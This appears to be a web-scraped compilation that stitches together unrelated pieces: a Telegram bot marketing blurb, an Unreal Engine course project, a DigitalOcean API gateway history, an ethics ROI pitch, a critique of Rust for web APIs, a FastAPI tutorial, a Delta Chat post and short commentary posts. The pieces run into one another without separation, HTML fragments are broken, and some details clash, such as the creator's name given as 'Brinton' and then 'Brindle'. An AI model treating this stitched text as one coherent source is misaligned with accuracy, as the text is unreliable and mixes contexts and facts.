<h2>What is this Telegram Bot?</h2>
<p>The Telegram Bot is simply accounts or profiles over Telegram operated by software which is generally powered by AI (artificial intelligence). They can literally do anything on behalf of you and your business, such as teaching, guiding, assisting, helping broadcast, reminding, connecting, integrating with other platforms, and taking users’ commands. With high-end technological engines of deep learning, machine learning, and NLP, it is possible to let a bot understand human context or tone easily and offer solutions in the meantime.</p>
<p>In simpler words,</p>
<p>“A <a href="https://botpenguin.com/chatbot-for-telegram/">Telegram Bot</a> is an AI-inspired bot that can serve companies or brands with many features such as sending out information, reminders, playing tunes, ordering, and more.”</p>

<p>For the <a rel="noreferrer noopener" href="https://www.tomlooman.com/stanford-cs193u/" target="_blank">Stanford University Fall 2020 Curriculum</a>, I built a small game project using mainly C++ mixed with some Blueprint in Unreal Engine. For those interested, the entire Computer Science course (CS193U) was provided through Zoom lectures and has been recorded. I’m working on getting this published and meanwhile, this project is already <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">open-source through GitHub</a> to be taken apart by anyone! </p>

<p><strong>Check out the project file <a rel="noreferrer noopener" href="https://github.com/tomlooman/ActionRoguelike" target="_blank">right here</a></strong> <strong>on GitHub!</strong></p>
<h2>Description</h2>
<p>The game was built with a wide set of features to cover a variety of useful coding concepts to students including AI, multiplayer programming, save games, async asset loading, etc. Check out the non-exhaustive list of features below, I’m sure there is more that I forgot to include or that will drip in at a later time.</p>
<p>Those interested in a GAS (<a href="https://docs.unrealengine.com/en-US/InteractiveExperiences/GameplayAbilitySystem/index.html" target="_blank" rel="noreferrer noopener">Gameplay Ability System</a>) style design might be keen to check out how we handled Abilities (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SAction.h" target="_blank" rel="noreferrer noopener">Action.h</a>) and Buffs/Debuffs (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SActionEffect.h" target="_blank" rel="noreferrer noopener">ActionEffect.h</a>) as this shares many similarities with GAS design, albeit its much simpler.</p>
<p>At the time of writing, there isn’t a whole lot that makes this a real ‘roguelike’ with things like permadeath or proper RNG. But, I hope to extend this project later on with more relevant features to have a proper game loop to earn the name ‘Action Roguelike’.</p>

<h2>Features</h2>
<p>Below I’ve listed some of the more relevant features included in the project. I think these code samples can be invaluable in getting an idea on how to use them in the Unreal Engine eco-system. Especially things like Asset Manager have limited public examples, which is one of the benefits of this open-source project.</p>

<h2>What’s Next?</h2>
<p>There is still a decent chunk of features I would like to add, including adding a proper game loop, items/abilities, Steamworks, etc. Whether these will actually see the light of day depends on many factors – including the final shape of the existing course recordings.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>

It’s so often the rags to riches, starving artist or the struggling entrepreneur that catches the headlines. Outside the world of start-up mythology however it’s more commonly risk aversion that keeps the world of business ticking over. 

<!-- -->Professor Ralph O’Swarm studied risk attitudes in 100 executives and found that they “do not portray the risk-takers we hear so much of in industrial folklore.”, “They quash new ideas in favor of marginal improvements, cost-cutting, and “safe” investments.” </span><a href="https://hbr.org/2020/03/your-company-is-too-risk-averse" target="_blank" rel="noopener"><u><span>hbr.org</span></u></a></span></p><blockquote id="viewer-9tlfe"><span><em><span>In current practice, however, executives in large corporations are reluctant to propose and advocate for risky projects. They quash new ideas in favor of marginal improvements, cost-cutting, and “safe” investments.</span></em></span></blockquote><p id="viewer-bnfgd"><span><span>So why aren’t more businesses making every effort to embed ethics into their organisations and products? At a very rudimentary level embedding ethics into your work will keep you a step ahead of compliance regulation and reduces the risk of negative PR from unethical business practices. Is it because it’s difficult to perceive the potential monetary value of ethics? Or the value lost by not incorporating ethics? 

At Hattusia although we believe that the value of ethics extends far beyond the bottom line on a balance sheet; it does have financial value. We created the Hattusia ROI calculator to look at exactly this. What is the risk of not embedding ethics into your work and what is the potential financial reward? </span></span></p><p id="viewer-5q5uq"><span><span>The following are three examples of (fictional) businesses within three different industries that we’ve put through the Hattusia ROI Calculator.

<span>We’ve seen the potential financial impact that can be caused by not embedding ethical practice into your products as Amazon and IBM have had to remove facial recognition products from the market due to a growing mistrust over the quality of the technology and its applications.

January 15, 2021 | https://macwright.com/2021/01/15/rust.html | <a href="https://web.archive.org/web/*/https://macwright.com/2021/01/15/rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Rust is an amazing language. It has enabled excellent CLI tools like <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> and <a href="https://github.com/ogham/exa">exa</a>. Companies like Cloudflare are using Rust for their own systems and <a href="https://blog.cloudflare.com/tag/rust/">encouraging people to write Rust to run microservices</a>. Rust makes it possible to write really fast software that’s secure, tiny, and more concise than C++ or C.</p><p>If I were writing a geocoder, a routing engine, a real-time messaging platform, a database, or a CLI tool, Rust would be at the top of the list.</p><p>But last year, I spent some time trying to make Rust work for a plain-vanilla API to power a normal website. It wasn’t a very good fit.</p><h3 id="lots-of-missing-pieces">Lots of missing pieces</h3><p>Rust has a fair number of web server frameworks, database connectors, and parsers. But building authentication? You have only <em>very</em> low-level parts. Where Node.js will give you <a href="http://www.passportjs.org/">passport</a> and Rails has <a href="https://github.com/heartcombo/devise">devise</a> and Django gives you an <a href="https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/Authentication">auth model out of the box</a>, in Rust you’re going to build this system by learning how to shuttle a shared vec into low-level crypto libraries. There are libraries trying to fix this, like <a href="https://github.com/breard-r/libreauth">libreauth</a>, but they’re nascent and niche. Repeat for plenty of other web framework problem areas.</p><p>How about SDKs? In mainstream languages, you’ll be able to plug into Google Cloud services, AWS, or Stripe by bringing in an official library. Those libraries are mostly great. The <a href="https://aws.amazon.com/sdk-for-javascript/">aws-sdk-js</a> and <a href="https://stripe.com/docs/libraries">Stripe libraries</a>, for example, are incredibly well-designed and maintained.</p><p>Not so with Rust. There are a few third-party libraries trying to fill in the blanks, which is great, but with the sheer velocity of those services, will they really be able to give a quality experience?</p><p>Some people will say <em>well, X language is so good you can just write an SDK yourself in a weekend!</em> To which I must reply, no.</p><p>Rust’s ecosystem is rich in other domains. The crates for building CLIs, managing concurrency, doing really impressive operations with binary data and low-level parsers - they’re spectacular.</p><h3 id="rusts-compiler-is-faster-than-it-was-but-still-slow">Rust’s compiler is faster than it was, but still slow</h3><p>I’ve been reading <a href="https://blog.mozilla.org/nnethercote/2020/09/08/how-to-speed-up-the-rust-compiler-one-last-time/">Nicholas Nethercote’s</a> <em>excellent</em> blog for years now, in which he describes how the Rust team has made the compiler faster. And they certainly have made it faster!</p><p>But compared to other languages you build websites with, it’s slow. It’s much slower than the Go compiler and much, much slower than the startup time for interpreted languages like JavaScript, Ruby, and Python.</p><p>Once your code is compiled, everything’s amazing! But in my case, this basic API - which wasn’t even feature-complete and was by no means a complex system - took more than ten minutes to compile. On the weak hardware of <a href="https://cloud.google.com/cloud-build">Google Code Build</a>, it would run out of time, every time. We couldn’t build anything.</p><p>Caching helps as long as you don’t have to rebuild cached dependencies. And, I don’t know, maybe <a href="https://blog.kodewerx.org/2020/06/the-rust-compiler-isnt-slow-we-are.html">slimming down dependencies</a> would help Rust projects compile faster. But <a href="https://serde.rs/">serde</a>, for example - the JSON and other-format serializer/deserializer that nearly everyone uses - takes up a huge chunk of compile time. Should we replace serde with something that compiles faster but lacks great documentation and ecosystem support? It’s a bad trade.</p><h3 id="rust-is-complicated">Rust is complicated</h3><p>Rust makes you think about dimensions of your code that matter tremendously for systems programming. It makes you think about how memory is shared or copied. It makes you think about real but unlikely corner cases and make sure that they’re handled. It helps you write code that’s incredibly efficient in every possible way.</p><p>These are all valid concerns. But for most web applications, they’re not the most important concerns. And buzzword-oriented thinking around them leads to some incorrect assumptions.</p><p>Take, for example, Rust’s safety. This is a big part of the marketing, and it’s absolutely correct: Rust’s main promise is to be both <em>safe</em> and <em>low-level</em> - it works without a garbage collector, while at the same time protecting against memory-based exploits. When you read “safety”, think about Rust competing with C. Code in C can reference arbitrary memory, can easily overflow and segfault. Rust code can be just as fast as that C code, but protect that memory access, and without the cost of a garbage collector or some kind of runtime checking.</p><p>But Rust’s memory rules aren’t more secure than Node.js’s or Python’s. Your web application written in Rust isn’t going to be systematically more or less secure than an application in Python or Ruby. High-level languages with garbage collectors pay a performance penalty in exchange for generally dodging this whole class of exploits and bugs. You can’t reference uninitialized memory in JavaScript because you simply can’t reference memory-as-memory in JavaScript.</p><details><summary>Sidenote…</summary>This is describing the design goal of Node.js and other systems - they do occasionally have bugs that creep into this problem area. The <a href="https://github.com/nodejs/node/issues/4660">previous behavior of Node.js's Buffer object, for example, is a good read.</a></details><p>Heck, if you ask <a href="https://deavid.wordpress.com/2020/01/18/actix-web-is-dead-about-unsafe-rust/">some people</a>, Rust is <em>less secure</em> than a GC’ed language for web apps if you use any crates that have <code>unsafe</code> code - which includes Actix, the most popular web framework, because <a href="https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html">unsafe code allows things like deferencing raw pointers</a>.</p><p>If you’re writing a video game, a pause to run garbage collection is bad. If you’re writing code for a microcontroller, any memory “overhead” or waste is really bad. But most web applications can spare a little memory overhead in exchange for productivity.</p><p>This argument is pretty much the same for the other attributes of Rust. Its concurrency primitives are <em>amazing</em> if you’re doing something complicated and need blistering-fast performance. But if you aren’t? The Rust async ecosystem is challenging, to say the least: there are different sorts of async, projects that span domains to do async implementations of unrelated stuff like <a href="https://tokio.rs/">tokio</a>.</p><p>It feels a lot less like Node.js, which had a good async story but ugly syntax, than Python Tornado or Twisted, which had a weird async story and also ugly syntax.</p><p>Async, I’m sure, will stabilize and homogenize and be a lot easier to do in the future. But I was working in the present.</p><h3 id="the-rust-ecosystem-is-not-web-centric">The Rust ecosystem is not web-centric</h3><p>There are many people currently learning Rust, writing CLI apps or low-level code in Rust, and having an extremely fun time. There are dramatically fewer people using Rust to write plain-vanilla web applications.</p><p>This is an important part of the equation for technology choices: are there people working with the tool <em>and</em> are they roughly in the same domain? Unfortunately, a lot of the incredibly exciting work in the Rust ecosystem has nothing to do with web application servers. There are some promising web frameworks - even a <a href="https://github.com/iron/iron">somewhat higher-level framework</a> - but they’re undoubtedly in a niche. Even Actix, the main web framework, has a <a href="https://github.com/actix/actix-web/graphs/contributors">very top-heavy set of contributors</a>.</p><p>If Rust grows at its current rate, the web portion of the community will reach a sort of critical mass, but right - I don’t think there are enough people using Rust for websites for it to be a practical tool for websites. And compare to other communities in which there are entire companies dedicated to building web applications with existing tools - not cutting-edge work, but the kind of stuff that differentiates a mature technology from a new one.</p><h3 id="the-juniper-crate-invites-n1s">The Juniper crate invites n+1s</h3><p>This part isn’t just about Rust, it’s about the GraphQL ecosystem and Rust’s involvement in that ecosystem is one example.</p><p><a href="https://www.infoq.com/articles/N-Plus-1/">The <strong>n+1</strong> problem</a> is something that everyone building web applications should understand. The gist is: you have a page of photos (1 query). You want to show the author of each photo. How many queries do you end up with: 1, combining the photos &amp; authors, or a query per photo to get the author after retrieving the photos? Or 2 queries, with the second having something like <code>user.id IN ids</code> to fetch all authors in a single pass and then reconnect them to their photos.</p><p>n+1 queries are usually the highest-priority database fixes: they’re usually high-impact, and changing an n+1 query into a single query is usually a big win. And we have lots of ways to try and resolve them: you can write SQL and try to get a lot done in a single query using CTEs and JOINs, like we did at Observable, or use an ORM layer like ActiveRecord that has <a href="https://guides.rubyonrails.org/active_record_querying.html#eager-loading-associations">quick ways to turn n+1 queries into predictable queries</a>.</p><p>We were using <a href="https://github.com/graphql-rust/juniper">Juniper</a>, a <a href="https://graphql.org/">GraphQL</a> server for Rust applications. GraphQL basically lets your <em>frontend application</em> define queries, instead of the backend. You give it a range of things it could query, and the application - React or something else - sends arbitrary queries to the backend.</p><p>This makes things <em>hard</em> for the backend. Any sort of SQL-level optimization is impossible - your server is writing dynamic SQL, so you rely on the intelligence of your GraphQL server, which is not always high. Juniper, for example: n+1 queries by default. The workaround - <a href="https://graphql-rust.github.io/juniper/master/advanced/dataloaders.html">a dataloader</a> - is rough and independently maintained. So at the end of the day, you’re going to have a blisteringly-fast application layer that’s spending all of its time inefficiently querying your database.</p><p>The word is that GraphQL works really well with non-SQL databases which can serve these sorts of requests fast. I’m sure that there’s some special database used internally at Facebook that’s incredible in combination with GraphQL, but the rest of industry is pretty attached to Postgres and its ilk, <a href="https://info.crunchydata.com/blog/postgres-the-batteries-included-database">for good reason</a>.</p><h3 id="lets-have-some-caveats">Let’s have some caveats!</h3><p>So I tried to lead with the main caveat: this isn’t about Rust in general. It’s about using the language and its ecosystem for a particular goal. Simple web APIs.</p><p>The caveat to that: in the general sense, you can build a website with anything and be successful. Remember how OkCupid was <a href="https://github.com/OkCupid/okws">implemented in C++</a>. There’s a popular <a href="https://www.costarastrology.com/">astrology app, Co-star</a>, that’s all Haskell. If you’re great at writing some language and you can hire other people with lots of talent, you can do it and be heroes.</p><p>Another caveat: what I was trying to build was a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a>-heavy web application API for a website. It wasn’t a web “service” as you might call them nowadays, something that …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-3d5c50e8=""><p data-v-3d5c50e8="">This article introduces an approach to structure FastAPI applications with multiple services in mind. The proposed structure decomposes the individual services into packages and modules, following principles of abstraction and separation of concerns. The code discussed below can also be studied in its entirety in a dedicated companion GitHub repository.</p>

<h2 id="fastapi--building-high-performing-python-apis" data-v-3d5c50e8="">FastAPI – Building High-performing Python APIs</h2>
<p data-v-3d5c50e8=""><a href="https://fastapi.tiangolo.com/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">FastAPI</a> is a fast, highly intuitive and well-documented API framework based on <a href="https://www.starlette.io/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Starlette</a>. Despite being relatively new, it's gaining <a href="https://star-history.t9t.io/#tiangolo/fastapi" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">strong adoption</a> by the developer community – it is even already being adopted in production by corporates like <a href="https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Netflix</a> and <a href="https://github.com/tiangolo/fastapi/pull/26" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Microsoft</a>.</p>
<p data-v-3d5c50e8="">Following the <a href="https://en.wikipedia.org/wiki/Unix_philosophy" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">UNIX philosophy</a> of <em data-v-3d5c50e8="">"doing one thing, and doing it well"</em>, separating parts of the application according to their task improves code readability and maintainability; ultimately reducing complexity. The main benefits of structuring applications in this way:</p>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Separation of concerns</strong> – Decomposing the application into modules performing a single job. This allows accepting requests (top down: controller → service → data access) and returning responses (bottom up: data access → service → controller) with a clear separation of what particular functionality should be implemented in which particular module, reducing cognitive load for development.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/6c6e6d1a9a2252c24c72049f74382abee765095c/9408a/_nuxt/img/request-response.df4b985.jpg" width="100%" height="" alt="Request-Response Flow across Application Layers" data-v-220acfa8=""></p><p data-v-220acfa8="">Request-Response Flow across Application Layers</p></div>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Abstraction</strong> — Components of the application are designed in a reusable way. For instance, <code data-v-3d5c50e8="">ServiceResult</code> is implemented as a generic outcome of a service operation (which may be successful and return a response, or unsuccessful and raise an exception) able to be used by all services of the app, keeping code <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">DRY</a>.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/fc6bd09df8db15e783bd11117eba8003350f04cc/465f4/_nuxt/img/directory-structure.0c63d71.jpg" width="100%" height="" alt="Directory Structure Overview" data-v-220acfa8=""></p><p data-v-220acfa8="">Directory Structure Overview</p></div>
<p data-v-3d5c50e8="">The granular nature of namespacing allow to distinguish parts of the application, e.g., routes versus business logic belonging to a particular service – grouping similar tasks together, while keeping distinct parts separated. Four principal packages are needed. For each service, one module is added to these four packages. For instance, a service called <em data-v-3d5c50e8="">"Foo"</em> requires the following modules (discussed in detail below):</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./routers/  foo.py </span><span data-v-3d5c50e8=""># Router instance and routes</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./services/ foo.py </span><span data-v-3d5c50e8=""># Business logic (including CRUD helpers)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./schemas/  foo.py </span><span data-v-3d5c50e8=""># Data "schemas" (e.g., Pydantic models)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./models/   foo.py </span><span data-v-3d5c50e8=""># Database models (e.g., SQLAlchemy models)</span></span></code></pre></div>
<p data-v-3d5c50e8="">The four principal packages are complemented by two generic packages which contain application-specific (and not service-specific) functionality, such as configuration or utility functions.</p>
<h2 id="controller-layer--routes" data-v-3d5c50e8="">Controller Layer – Routes</h2>
<p data-v-3d5c50e8="">Within <code data-v-3d5c50e8="">main</code>, the application is instantiated and all routers are included. Additionally, middlewares and/or exception handlers are implemented. The example application discussed below is based on a service called <code data-v-3d5c50e8="">Foo</code>, which requires a number of routes. To handle custom exceptions occurring at the service layer, as instances of class <code data-v-3d5c50e8="">AppExceptionCase</code>, a respective exception handler is added to the application.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><data value="https://jlelse.blog/posts/email-messenger-delta-chat"></data><div><p>Published on <time datetime="2021-01-14T17:23:36+01:00">January 14, 2021</time> in <a href="https://jlelse.blog/posts">✍️ Posts</a></p></div><div><p>Today I have heard again a discussion about WhatsApp, Telegram, Signal and Threema and there was the question to which messenger one would switch from WhatsApp.</p><p>While I find Telegram very pleasant as an everyday messenger, since it offers me the best user experience and also has some features (bots, channels) that other messengers don’t have, <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Delta Chat came to mind again</a>.</p><p>Everyone has an email address, email is decentralized and Delta Chat encrypts messages automatically.</p><blockquote><p>What I really like about this is, that using the existing email infrastructure enables everyone to communicate with each other without the restriction to use the same messenger or client. Anyone can choose any client and can still be connected. Just login with your usual email account. You don’t even need to use one of those messaging optimized clients and stay with your regular email client.</p><p>– <a href="https://jlelse.blog/thoughts/2019/03/delta-chat">Jan-Lukas Else (2019)</a></p></blockquote><p>I installed <a href="https://delta.chat/" target="_blank" rel="noopener">Delta Chat</a> on my smartphone again today. While the app wasn’t quite mature 2 years ago, I have to say it’s pretty decent now. The Android app seems to be based on the Signal interface. But Delta Chat is also available for desktops (Windows, macOS and Linux) and iOS. And the best part - something Signal, Threema and WhatsApp have problems with - Delta Chat can be used from multiple devices without any problems.</p><p>But the most important thing: Delta Chat allows you to communicate even with people who don’t use Delta Chat at all, all you need is an email address! If you write to someone without Delta Chat, they will just get a normal email. I would argue that even beats Matrix or XMPP.</p><p>Conclusion: If you are concerned about security when chatting and would rather use a decentralized messenger (no silo), you are in good hands with email and Delta Chat.</p><p>However, it would be advisable not to use Gmail, Outlook or GMX as email service, but a reasonable email service. I use <a href="https://www.servercow.de/mailcow?lang=en" target="_blank" rel="noopener">mailcow</a> for example, where just today there was <a href="https://mailcow.email/2021/01/14/back-to-the-future-with-delta-chat/" target="_blank" rel="noopener">an announcement about Delta Chat</a>.</p></div><p><b>Tags</b>:

<p>Seven years ago, the Academy-Award-winning documentarian Laura Poitras co-founded First Look Media, and its subsidiaries/sister companies The Intercept and Field of Vision.</p>
<p>Late last year, they fired her.</p>
<p>Poitras has published a lengthy letter about her dismissal in which she says that she was fired for publicly criticizing The Intercept's handling of the Reality Winner leaks – an incident that ended with Winner in federal prison for five years.</p>
<p><a href="https://www.praxisfilms.org/open-letter-from-laura-poitras/">https://www.praxisfilms.org/open-letter-from-laura-poitras/</a></p>
<p>The Intercept investigated its handling of the Winner leaks, and concluded that it made mistakes. But Poitras says that the internal investigation was never independent, and allowed people who were implicated in the failures to oversee the postmortem on those failures.</p>
<p>First Look says Poitras's dismissal was "natural," and the result of her "stepping away" from her duties at the company to do "her own projects."</p>
<p><a href="https://www.washingtonpost.com/lifestyle/media/laura-poitras-fired-intercept-first-look-reality-winner/2021/01/14/478a9c30-55e7-11eb-a08b-f1381ef3d207_story.html">https://www.washingtonpost.com/lifestyle/media/laura-poitras-fired-intercept-first-look-reality-winner/2021/01/14/478a9c30-55e7-11eb-a08b-f1381ef3d207_story.html</a></p>
<p>I have an interest here. I have sincere, deep admiration for Poitras. I contributed to the program book for her one-woman show at the Whitney, reported out a Snowden leak with her team, and one of my proudest moments was the cameo my book HOMELAND got in her doc CITIZENFOUR.</p>
<p>And I have worked with First Look; I worked for months on a video project with them, and then they optioned my novella UNAUTHORIZED BREAD. Everyone I've worked with there was bright, committed, passionate and good at their jobs.</p>
<p>Despite all that, I have no personal knowledge of any of the underlying facts.</p>
<p>Here's what I do know, though: Laura Poitras is one of the bravest, most talented filmmakers and journalists I know. She is both a good person and very good at what she does.</p>
<p>And I also know that The Intercept publishes some of the best investigative journalism today. Their work has been hugely important to me and my understanding of the world. Not a day goes by that I don't learn something profound from its work.</p>
<p>When you put those two facts together, here's what you get: profound sadness. A media entity that means a lot to me has fired one of their best journalists, who also helped found the organization. This is not a good day. Poitras's work is critical to this ghastly moment.</p>
<p>First Look is much poorer without her.</p>

<p>There came a point in my life as an RPG player where I largely stopped playing the games in favor of mostly thinking about the games, handling the materials, and reading the rulebooks.</p>
<p>The physicality of D&amp;D was always the most important part for me: the dice, the tables, the minis, the maps. I love me a D&amp;D object.</p>
<p>So I've backed "Tiny Paper Dungeons," Tom Brinton's Kickstarter campaign for a pocket-steno-pad-sized book of procedurally generated RPGs.</p>
<p><a href="https://www.kickstarter.com/projects/brintown/tiny-paper-dungeons/">https://www.kickstarter.com/projects/brintown/tiny-paper-dungeons/</a></p>
<p>Brinton's little game-book includes 50 dungeon maps that you play with a pencil and a D6, acquiring items and leveling up your stats.</p>
<p>The games are generated with Drawbot, and each pad is unique:</p>
<p><a href="https://www.drawbot.com/">https://www.drawbot.com/</a></p>
<p>The pads are printed in Utah, $5 each, for delivery in April. Brindle's done this stuff before and seems confident he can deliver (assuming covid doesn't shut down his printer).</p>
<p>As to gameplay, he says, "I'm trying to strip this genre down to its simplest form: 1 player, simple mechanics, no story-telling, just you, a die and pencil, and a series of simple decisions in the face of randomness."</p>
<p>I ordered two.</p>

<p>A monopolist's first preference is not to be regulated.</p>
<p>A monopolist's second preference is to be regulated in a way that only it can comply with – and that none of its competitors can comply with.</p>
<p>Oh, hai, Facebook COO Sheryl Sandberg!</p>
<p>"I think [the insurrection was] largely organized on platforms that don’t have our abilities to stop hate, and don’t have our standards, and don’t have our transparency."</p>
